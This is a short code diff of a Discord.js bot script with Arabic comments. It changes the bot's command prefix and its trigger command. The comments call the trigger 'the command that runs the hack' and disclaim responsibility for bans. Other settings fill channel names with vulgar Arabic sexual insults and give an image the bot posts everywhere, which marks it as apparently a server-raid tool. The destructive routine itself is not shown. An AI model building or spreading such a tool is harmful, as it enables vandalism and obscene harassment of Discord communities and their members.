@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
- const prefix = "!";
+ const prefix = ".";
 client.on('ready', () => {
     console.log('I am ready!');
 });
@@ -12,7 +12,7 @@ client.on('message', message => {
 });
  
 //انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
-const x_x = "!run" //هنا تحط الامر اللي يشغل الهاك
+const x_x = ".run" //هنا تحط الامر اللي يشغل الهاك
 const teext = "كسمكم يا اخوات القحبه " //هنا تحط وش تبي يكون اسم الرومات الكتابيه
 const vooice = "تغدروا انيكم يا متناكين" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
 const pic = "https://cdn.discordapp.com/attachments/444003405992689665/503998252572475392/giphy.gif" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
